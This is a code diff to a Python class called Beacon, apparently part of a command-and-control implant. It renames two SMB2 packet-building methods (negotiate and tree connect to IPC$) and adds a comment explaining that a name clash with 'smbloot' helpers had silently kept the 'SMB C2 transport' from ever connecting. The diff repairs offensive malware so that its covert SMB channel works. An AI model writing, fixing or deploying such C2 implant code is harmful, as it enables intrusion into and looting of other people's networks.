@@ -1843,7 +1843,7 @@ class Beacon:
             sock.connect((host, port))
 
             # SMB2 Negotiate
-            neg = self._smb2_negotiate()
+            neg = self._smb2_negotiate_request()
             sock.sendall(self._smb_netbios_wrap(neg))
             resp = self._smb_recv(sock)
             if not resp or resp[12:14] != b"\x00\x00":
@@ -1860,7 +1860,7 @@ class Beacon:
             self._smb_session_id = resp[44:52]
 
             # SMB2 Tree Connect to IPC$
-            tree = self._smb2_tree_connect(host)
+            tree = self._smb2_tree_connect_request(host)
             sock.sendall(self._smb_netbios_wrap(tree))
             resp = self._smb_recv(sock)
             if not resp:
@@ -1904,7 +1904,16 @@ class Beacon:
         except Exception:
             return None
 
-    def _smb2_negotiate(self) -> bytes:
+    def _smb2_negotiate_request(self) -> bytes:
+        # The `_request` suffix is not decoration. This method and
+        # `_smb2_tree_connect_request` below used to be called
+        # `_smb2_negotiate` and `_smb2_tree_connect`, which are also the
+        # names of the smbloot helpers further down this class -- and those
+        # come later, so they won. `_smb_connect` called them with the
+        # wrong arguments, raised TypeError on its first real statement,
+        # caught it, logged at debug level and returned None: the SMB C2
+        # transport could never connect, and said nothing about it. A test
+        # now walks the project for any name bound twice in one scope.
         hdr = b"\xfeSMB"
         hdr += struct.pack("<H", 64)         # StructureSize
         hdr += struct.pack("<H", 0)          # CreditCharge
@@ -1950,7 +1959,7 @@ class Beacon:
         body += ntlm
         return hdr + body
 
-    def _smb2_tree_connect(self, host: str) -> bytes:
+    def _smb2_tree_connect_request(self, host: str) -> bytes:
         hdr = self._smb2_header(3, 0)       # Command: TREE_CONNECT
         path = f"\\\\{host}\\IPC$".encode("utf-16-le")
         body = struct.pack("<H", 9)          # StructureSize
